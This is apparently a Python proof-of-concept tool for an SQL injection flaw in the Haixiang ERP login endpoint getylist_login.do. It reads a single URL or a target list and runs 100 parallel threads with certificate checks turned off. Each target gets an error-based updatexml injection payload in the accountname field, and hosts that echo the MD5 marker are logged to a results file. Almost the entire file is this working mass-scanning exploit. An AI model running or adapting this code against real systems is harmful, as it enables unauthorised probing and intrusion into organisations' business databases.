import argparse,sys,re,requests
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:海翔ERP getylist_login.do SQL注入漏洞     
                                        version:1.0 author:YeahSir               
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='海翔ERP getylist_login.do SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file file.txt.path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = "/getylist_login.do"
    url = target + payload_url
    header = {
        "Accept-Encoding": "gzip",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8:",
		"Content-Length": "75"
    }

    data = "accountname=test' and (updatexml(1,concat(0x7e,(select md5(1)),0x7e),1));--"
    try:
        res1 = requests.get(url=target, verify=False)
        res2 = requests.post(url=url, headers=header, data=data, verify=False)
        if res1.status_code == 200:
            if 'c4ca4238a0b923820dcc509a6f75849' in res2.text:
                print(f'[+] 该url{target}存在SQL注入漏洞')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-] 该站点{target}不存在SQL漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()